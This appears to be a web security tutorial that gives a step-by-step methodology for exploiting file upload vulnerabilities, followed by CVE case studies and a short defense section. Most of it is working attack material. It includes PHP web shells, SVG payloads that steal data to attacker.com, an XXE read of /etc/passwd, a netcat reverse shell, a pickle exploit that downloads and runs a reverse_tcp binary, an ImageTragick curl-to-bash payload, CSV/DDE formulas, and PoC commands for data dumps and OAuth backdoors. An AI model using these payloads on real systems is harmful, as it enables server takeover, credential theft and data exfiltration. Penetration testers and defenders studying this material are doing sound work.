# The Complete Methodology for Exploiting File Upload Vulnerabilities

File upload vulnerabilities are among the most critical security flaws in web applications. When successfully exploited, they can lead to Remote Code Execution (RCE), full server compromise, data theft, and lateral movement across infrastructure . This guide provides a comprehensive, step-by-step methodology for testing and exploiting file upload vulnerabilities, complete with real-world examples, tool usage, and practical techniques.

---

## Table of Contents

1. [Understanding the Attack Surface](#understanding-the-attack-surface)
2. [Methodology Overview](#methodology-overview)
3. [Phase 1: Reconnaissance and Mapping](#phase-1-reconnaissance-and-mapping)
4. [Phase 2: Basic Bypass Testing](#phase-2-basic-bypass-testing)
5. [Phase 3: Advanced Bypass Techniques](#phase-3-advanced-bypass-techniques)
6. [Phase 4: Exploitation and Payload Delivery](#phase-4-exploitation-and-payload-delivery)
7. [Real-World Exploit Chains (Past and Present)](#real-world-exploit-chains-past-and-present)
8. [Tool Setup and Usage Guide](#tool-setup-and-usage-guide)
9. [Testing Checklist](#testing-checklist)
10. [Defense and Mitigation](#defense-and-mitigation)

---

## Understanding the Attack Surface

File upload vulnerabilities occur when an application fails to properly validate, sanitize, or restrict files uploaded by users. The impact ranges from denial of service to complete system compromise.

**Common vulnerable components:**
- User profile picture uploads
- Document management systems
- CMS theme/plugin uploaders
- Contact form file attachments
- API endpoints accepting binary data
- Backup and import functionality

---

## Methodology Overview

The exploitation process follows a systematic approach:

```
Phase 1: Reconnaissance → Identify upload points and analyze restrictions
Phase 2: Basic Bypass   → Test simple validation bypasses
Phase 3: Advanced       → Chain techniques for complex filters
Phase 4: Exploitation   → Deploy payloads and establish persistence
```

---

## Phase 1: Reconnaissance and Mapping

### 1.1 Identifying Upload Functionality

Begin by mapping all file upload endpoints in the target application.

**Manual discovery:**
- Review all forms for file input fields (`<input type="file">`)
- Check API documentation for endpoints accepting `multipart/form-data`
- Examine JavaScript files for upload-related functions

**Automated discovery:**
```bash
# Using ffuf to discover upload endpoints
ffuf -u https://target.com/FUZZ -w upload_endpoints.txt

# Using gospider to crawl for upload functionality
gospider -s https://target.com | grep -i "upload"
```

### 1.2 Analyzing Upload Behavior

Before attempting exploits, understand how the application processes uploads:

| Question to Answer | Method |
|-------------------|--------|
| Where are files stored? | Check response URLs, error messages |
| Are uploaded files accessible? | Attempt to access the uploaded file directly |
| What extensions are allowed? | Test with harmless files of different types |
| Is there filename transformation? | Upload `test.txt` and see what name is used |
| What MIME types are accepted? | Modify `Content-Type` and observe responses |

### 1.3 Information Gathering Through Error Messages

Upload deliberately malformed files to trigger error messages that reveal system information:

**Test files:**
- `test.php` - May reveal blacklisted extensions
- `test.php.jpg` - Shows how extensions are parsed
- `test%00.jpg` - May reveal null byte handling
- Oversized files - Reveals size limits
- Empty files - Shows validation logic

---

## Phase 2: Basic Bypass Testing

### 2.1 Client-Side Bypass

Many applications implement only client-side validation, which is trivially bypassed.

**Real-World Example: DVWA Low Security Level **

In DVWA's low security configuration, only JavaScript validates file extensions. The bypass is simple:

1. Attempt to upload `shell.php` - Blocked by JavaScript alert
2. Rename to `shell.png` - Passes client validation
3. Intercept with Burp Suite and change filename back to `shell.php`

**Using Burp Suite for client-side bypass :**

```
Step 1: Configure Burp as proxy (127.0.0.1:8080)
Step 2: Attempt upload while intercept is ON
Step 3: In the intercepted request, modify:
    Content-Disposition: form-data; name="uploaded_file"; filename="shell.png"
    → Change to: filename="shell.php"
Step 4: Forward the modified request
```

### 2.2 Content-Type Spoofing

Servers that trust the `Content-Type` header are vulnerable to MIME type spoofing.

**Vulnerable code pattern:**
```php
if($_FILES['file']['type'] == "image/jpeg") {
    move_uploaded_file($_FILES['file']['tmp_name'], "uploads/".$_FILES['file']['name']);
}
```

**Bypass technique:**
```
Original: Content-Type: application/x-php
Modified: Content-Type: image/jpeg
```

**Real-World Example: CVE-2026-40487 - Postiz SVG Upload **

Postiz <= 2.21.5 validated only the `Content-Type` header without inspecting file content:

```http
POST /api/upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="malicious.svg"
Content-Type: image/png   ← Spoofed to bypass validation

<svg onload="fetch('/api/user', {credentials:'include'})">
------WebKitFormBoundary--
```

The server accepted the file because `Content-Type: image/png` passed validation, but nginx served it as `image/svg+xml` based on the `.svg` extension, executing JavaScript in the victim's browser .

### 2.3 Double Extension Bypass

When servers check only the last extension or the first extension, double extensions can bypass.

**Testing matrix:**
| Filename | Server checks last | Server checks first | Result |
|----------|-------------------|---------------------|--------|
| `shell.php.jpg` | .jpg (allowed) | .php (blocked?) | Depends on logic |
| `shell.jpg.php` | .php (blocked) | .jpg (allowed) | Bypass if checks first only |

**Real-World Example: CVE-2025-10353 - Melis Platform **

The Melis CMS Slider module failed to properly validate uploaded files via the `mcsdetail_img` parameter. Attackers could upload PHP files that were stored in web-accessible directories. The parameter `mcsdetail_mcslider_id` controlled the destination directory, and setting it to `0` stored files in a hidden directory not visible through the web interface, enabling persistent webshells .

### 2.4 Case Manipulation Bypass

On case-insensitive file systems (Windows) or misconfigured Apache servers, case variation bypasses blacklists.

**Test payloads:**
```
shell.php  → Blocked
shell.PhP  → May be allowed
shell.PHP5 → Alternative extension
shell.pHp  → Mixed case
```

### 2.5 Magic Number Bypass

Servers using `getimagesize()` or `finfo_file()` check actual file signatures. Bypass by prepending valid magic bytes.

**Common magic bytes:**
```
GIF89a;                    → GIF
\xFF\xD8\xFF\xE0           → JPEG
\x89PNG\r\n\x1A\n          → PNG
%PDF-1.0                   → PDF
```

**Payload construction:**
```php
GIF89a;
<?php system($_GET['cmd']); ?>
```

Save as `shell.php` with `Content-Type: image/gif`. The server validates the GIF magic bytes and accepts the file.

---

## Phase 3: Advanced Bypass Techniques

### 3.1 Null Byte Injection (PHP < 5.3.4)

PHP versions before 5.3.4 treated null bytes as string terminators, allowing filename truncation.

**The technique:**
```
Filename: shell.php%00.jpg
How PHP sees it: "shell.php" (stops at %00)
Filesystem sees: "shell.php%00.jpg" (creates shell.php)
```

**Using Burp Suite for null byte injection :**

1. Capture the upload request
2. Locate the filename parameter
3. Insert `%00` before the allowed extension
4. URL-encode the null byte (Burp does this automatically when you type `%00`)

```
Original: filename="shell.jpg"
Modified: filename="shell.php%00.jpg"
```

### 3.2 Path Traversal in Filename

If the server concatenates the upload directory with the filename without sanitization, path traversal writes files outside the intended directory.

**Payload examples:**
```
../../../var/www/html/shell.php
..\..\..\config.php
/var/www/html/shell.php
..\\..\\shell.php
```

**Real-World Example: CVE-2026-39387 - BoidCMS **

BoidCMS versions prior to 2.1.3 suffered from a Local File Inclusion (LFI) vulnerability that became RCE when chained with file upload. The `tpl` parameter in page creation was passed directly to `require_once()` without sanitization. Attackers could:

1. Upload a file with embedded PHP code disguised as an image
2. Use path traversal in the `tpl` parameter to include that file
3. Execute arbitrary PHP code with web server privileges

This demonstrates how file upload vulnerabilities often combine with other flaws for full exploitation .

### 3.3 Content-Length Manipulation

Modifying the `Content-Length` header can confuse servers that validate file size based on this header alone.

**Technique:**
```
Original Content-Length: 5000
Modified Content-Length: 100
```

The server checks `Content-Length: 100` and approves the small file, but the actual data received may be larger, causing truncation or buffer issues.

### 3.4 Using .htaccess for PHP Execution

On Apache servers, uploading a malicious `.htaccess` file can force images to be executed as PHP.

**.htaccess payload:**
```apache
AddType application/x-httpd-php .jpg .png .gif
```

After uploading this `.htaccess` file, any subsequent upload with `.jpg` extension will be executed as PHP, enabling webshells disguised as images.

### 3.5 Zip Slip Attack

When applications extract ZIP files without validating path traversal sequences, files can be written outside the extraction directory.

**Exploitation steps:**
1. Create a ZIP file containing `../../../var/www/html/shell.php`
2. Upload the ZIP file
3. When extracted, `shell.php` is written to the web root

**Creating malicious ZIP:**
```bash
# On Linux
ln -s ../../../var/www/html/shell.php shell.php
zip --symlinks evil.zip shell.php

# Using Python
python3 -c "import zipfile; z=zipfile.ZipFile('evil.zip','w'); z.writestr('../../../shell.php', '<?php system(\$_GET[cmd]);?>')"
```

### 3.6 SVG XSS and XXE Chain

SVG files are XML-based and support JavaScript execution and external entity inclusion.

**XSS Payload :**
```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <rect width="300" height="100" style="fill:rgb(0,0,255)" />
  <script type="text/javascript">
    fetch('/api/user', {credentials:'include'})
      .then(r => r.json())
      .then(data => fetch('https://attacker.com/steal', {method:'POST', body:JSON.stringify(data)}));
  </script>
</svg>
```

**XXE Payload:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg width="500" height="500" xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="50">&xxe;</text>
</svg>
```

**Real-World Example: CVE-2026-40487 Chain **

In Postiz, attackers could upload an SVG with spoofed MIME type, leading to stored XSS. When victims opened the file URL, JavaScript executed in the application's origin, allowing the attacker to:
- Steal OAuth tokens for all connected social media accounts
- Create backdoor OAuth apps with persistent tokens
- Post, edit, and delete content as the victim
- Invite the attacker as admin in the victim's organization

The complete attack chain was automated in a Python PoC with 33 different attack modes .

---

## Phase 4: Exploitation and Payload Delivery

### 4.1 Web Shell Deployment

Once file upload is achieved, deploy a web shell for persistent access.

**Simple PHP web shell:**
```php
<?php system($_GET['cmd']); ?>
```

**More robust web shell:**
```php
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
```

**Access pattern:**
```
https://target.com/uploads/shell.php?cmd=id
https://target.com/uploads/shell.php?cmd=cat%20/etc/passwd
https://target.com/uploads/shell.php?cmd=nc%20-e%20/bin/sh%20attacker-ip%204444
```

### 4.2 Pickle Deserialization RCE

Some applications use Python's `pickle` module for deserialization, which is inherently unsafe .

**Real-World Example: Crypto Exchange Audit **

During a security audit of a crypto exchange, auditors discovered the file upload API passed uploaded files directly to `cPickle.loads()` without validation.

**Exploit code:**
```python
import cPickle
import base64

class PickleRce(object):
    def __reduce__(self):
        import os
        cmd = 'wget http://attacker-ip/reverse_tcp; chmod +x reverse_tcp; ./reverse_tcp'
        return (os.system, (cmd,))

# Generate malicious payload
payload = cPickle.dumps(PickleRce())
open('malicious.bin', 'wb').write(payload)
```

Uploading this binary file resulted in command execution on the server, leading to full system compromise .

### 4.3 CSV Injection

When uploaded CSV files are opened in spreadsheet software, formula injection can lead to RCE.

**Payload examples:**
```
=cmd|'/C calc'!A0
=HYPERLINK("http://attacker-ip/steal?data="&A1,"Click me")
=DDE("cmd";"/C calc";"True")
```

### 4.4 ImageTragick (CVE-2016-3714)

ImageMagick versions before 6.9.3-10 are vulnerable to command injection via malformed image files.

**MVG payload:**
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|curl http://attacker-ip/shell.sh | bash")'
pop graphic-context
```

---

## Real-World Exploit Chains (Past and Present)

### Case Study 1: CVE-2026-0740 - Ninja Forms File Uploads (Critical RCE) 

**Affected:** Ninja Forms – File Uploads extension for WordPress (versions ≤ 3.3.26)

**Vulnerability Type:** Unauthenticated arbitrary file upload

**Root Cause:** The plugin validated the file type of the source filename but not the destination filename during the move operation. An attacker could bypass the extension allowlist by manipulating the destination path.

**Impact:**
- CVSS 9.8 (Critical)
- Unauthenticated RCE
- No user interaction required

**Fix:** Version 3.3.27 (released March 19, 2026) fully remediated the issue. Approximately 50,000 active WordPress installations were affected .

### Case Study 2: CVE-2026-40487 - Postiz SVG Upload to Account Takeover 

**Affected:** Postiz ≤ 2.21.5 (social media management tool)

**Vulnerability Chain:**
1. **CWE-345 (MIME-Type Validation Trusts Client Input)** - Server accepted `Content-Type: image/png` without magic byte inspection
2. **CWE-434 (Unrestricted File Upload)** - Original `.svg` extension preserved on disk
3. **CWE-79 (Stored XSS)** - nginx served as `image/svg+xml`, executing JavaScript

**Impact:**
- Full account takeover
- Exfiltration of API keys and OAuth tokens for all connected social accounts
- Persistent backdoor creation (tokens surviving password changes)
- Sabotage and data destruction

**PoC Availability:** Public exploit with 33 attack modes 

### Case Study 3: CVE-2025-10353 - Melis Platform Unauthenticated File Upload 

**Affected:** Melis Platform CMS (melis-cms-slider module)

**Vulnerability Type:** Unauthenticated file upload leading to RCE

**Attack Vector:**
```
POST /melis/MelisCmsSlider/MelisCmsSliderDetails/saveDetailsForm HTTP/1.1
Parameter: mcsdetail_img (file upload)
Parameter: mcsdetail_mcslider_id (controls destination directory)
```

**Key Insight:** Setting `mcsdetail_mcslider_id=0` stored the webshell in a hidden directory not visible through the standard web interface, making discovery more difficult .

### Case Study 4: Pachno 1.0.6 Unrestricted File Upload 

**Affected:** Pachno ≤ 1.0.6

**Vulnerability Type:** Authenticated users can upload arbitrary file types

**Root Cause:** Ineffective extension filtering to the `/uploadfile` endpoint

**Impact:** Attackers could upload `.php5` scripts to web-accessible directories and execute them for RCE .

### Case Study 5: adaptcmsv3.0.3 Authenticated File Upload to RCE 

**Affected:** adaptcmsv3.0.3

**Attack Steps:**
1. Login as admin user
2. Navigate to System > Appearance > Themes > Default > Theme Files
3. Select "Add New File"
4. Add PHP payload in file contents
5. Set extension to "php" and folder to "Images"

**HTTP Request:**
```http
POST /adaptcms/admin/themes/asset_add/Default HTTP/1.1
Host: 192.168.58.131

------geckoformboundary
Content-Disposition: form-data; name="data[Asset][content]"

<?php phpinfo(); ?>
------geckoformboundary
Content-Disposition: form-data; name="data[Asset][file_extension]"

php
------geckoformboundary--
```

**Result:** Webshell accessible at `/adaptcms/app/webroot/img/test.php` 

---

## Tool Setup and Usage Guide

### Burp Suite Configuration 

**Setting up Burp Suite for file upload testing:**

1. **Proxy Setup:**
   - Open Burp Suite → Proxy → Options
   - Add listener on 127.0.0.1:8080
   - Configure browser to use this proxy

2. **Intercepting Upload Requests:**
   - Proxy → Intercept → Turn Intercept On
   - Upload a file through the target application
   - The request appears in Burp

3. **Using Repeater for Manual Testing:**
   - Right-click intercepted request → Send to Repeater
   - Modify filename, Content-Type, or request body
   - Click "Send" and analyze response

4. **Using Intruder for Fuzzing:**
   - Send request to Intruder
   - Highlight filename value → Add §
   - Payloads tab → Load extension list
   - Start attack and analyze results

### Python Script for Automated Testing 

```python
import requests

def test_file_upload(url, file_path, malicious_payloads):
    """Test file upload vulnerabilities with various bypass techniques"""
    
    # Test 1: Extension variation
    extensions = ['php', 'php5', 'phtml', 'PhP', 'PHP', 'php.jpg']
    
    for ext in extensions:
        files = {
            'file': (f'shell.{ext}', '<?php system($_GET["cmd"]); ?>', 'image/jpeg')
        }
        response = requests.post(url, files=files)
        print(f"Testing {ext}: {response.status_code}")
        
    # Test 2: Magic number bypass
    magic_bytes = b'GIF89a;'
    php_code = b'<?php system($_GET["cmd"]); ?>'
    
    files = {
        'file': ('shell.php', magic_bytes + php_code, 'image/gif')
    }
    response = requests.post(url, files=files)
    
    # Test 3: Path traversal
    files = {
        'file': ('../../../shell.php', '<?php phpinfo(); ?>', 'application/x-php')
    }
    response = requests.post(url, files=files)

# Usage
test_file_upload('https://target.com/upload.php', 'shell.php', [])
```

### Fuxploider for Automated Bypass Scanning

```bash
# Basic scan
python3 fuxploider.py --url https://target.com/upload.php

# With exclusion pattern
python3 fuxploider.py --url https://target.com/upload --not-regex "File type not allowed"

# With cookie authentication
python3 fuxploider.py --url https://target.com/upload --cookie "PHPSESSID=abc123"

# Output results
python3 fuxploider.py --url https://target.com/upload --output report.json
```

### CVE-2026-40487 PoC Tool 

The public PoC for Postiz demonstrates advanced exploitation:

```bash
# Check if target is vulnerable
python3 poc.py http://target:5000 -e attacker@evil.com -p password --check

# Full data exfiltration
python3 poc.py http://target:5000 -e attacker@evil.com -p password \
    --lhost YOUR_IP -a full-dump

# Create persistent backdoor
python3 poc.py http://target:5000 -e attacker@evil.com -p password \
    --lhost YOUR_IP -a create-oauth-app

# Reuse token without credentials
python3 poc.py http://target:5000 -t pos_XXXX...XXXX \
    --lhost YOUR_IP -a full-dump

# Route through Burp for analysis
python3 poc.py http://target:5000 -e attacker@evil.com -p password \
    --proxy http://127.0.0.1:8080 -a full-dump
```

---

## Testing Checklist

### Phase 1: Information Gathering
- [ ] Identify all file upload endpoints
- [ ] Determine allowed file types through testing
- [ ] Identify filename transformation rules
- [ ] Locate where uploaded files are stored
- [ ] Check if uploaded files are directly accessible

### Phase 2: Basic Bypass Tests
- [ ] Client-side validation bypass (disable JavaScript)
- [ ] Content-Type spoofing (image/jpeg, image/png)
- [ ] Double extensions (.php.jpg, .jpg.php)
- [ ] Case variation (.PhP, .pHp, .PHP5)
- [ ] Magic number injection (GIF89a;, etc.)

### Phase 3: Advanced Bypass Tests
- [ ] Null byte injection (%00, \x00)
- [ ] Path traversal (../, ..\, %2e%2e%2f)
- [ ] Content-Length manipulation
- [ ] .htaccess upload
- [ ] Zip Slip (malicious ZIP archives)
- [ ] SVG XSS and XXE payloads
- [ ] CSV formula injection

### Phase 4: Exploitation
- [ ] Deploy web shell (PHP, ASP, JSP)
- [ ] Test command execution via webshell
- [ ] Establish reverse shell
- [ ] Pivot to internal network
- [ ] Exfiltrate sensitive data

---

## Defense and Mitigation

For defenders implementing file upload functionality:

### Must-Implement Controls

1. **Whitelist Allowed Extensions** - Never use blacklists
2. **Rename Uploaded Files** - Use UUIDs with correct extensions
3. **Validate File Content** - Use `finfo_file()` or magic byte detection, never trust `Content-Type` header 
4. **Store Files Outside Webroot** - Serve through a proxy script
5. **Disable Execution in Upload Directory** - Use `.htaccess` or equivalent
6. **Implement Anti-Virus Scanning** - Check for known malware signatures
7. **Set File Size Limits** - Prevent DoS attacks
8. **Log All Uploads** - Monitor for suspicious patterns

### Framework-Specific Protections

**WordPress:** Keep plugins updated. The Ninja Forms vulnerability (CVE-2026-0740) affected 50,000 sites and required immediate updating to version 3.3.27 .

**PHP:** Disable dangerous functions in `php.ini`:
```
disable_functions = exec,system,passthru,shell_exec,proc_open
```

**Apache:** Prevent script execution in upload directories:
```apache
<Directory "/var/www/uploads">
    php_flag engine off
    Options -ExecCGI
    AddType text/plain .html .htm .shtml .php
</Directory>
```

**Nginx:** Prevent execution and disable MIME sniffing :
```nginx
location /uploads/ {
    default_type text/plain;
    add_header X-Content-Type-Options "nosniff";
    location ~* \.(php|pl|cgi|py|sh) {
        return 403;
    }
}
```

---

## References

1. DVWA File Upload Vulnerability Demonstration 
2. CVE-2025-10353 - Melis Platform Unauthenticated File Upload 
3. Burp Suite File Upload Testing Methodology 
4. CVE-2026-39387 - BoidCMS LFI to RCE Chain 
5. CVE-2026-40487 - Postiz SVG Upload to Account Takeover 
6. CVE-2026-0740 - Ninja Forms Unauthenticated RCE 
7. Pickle Deserialization RCE via File Upload 

---
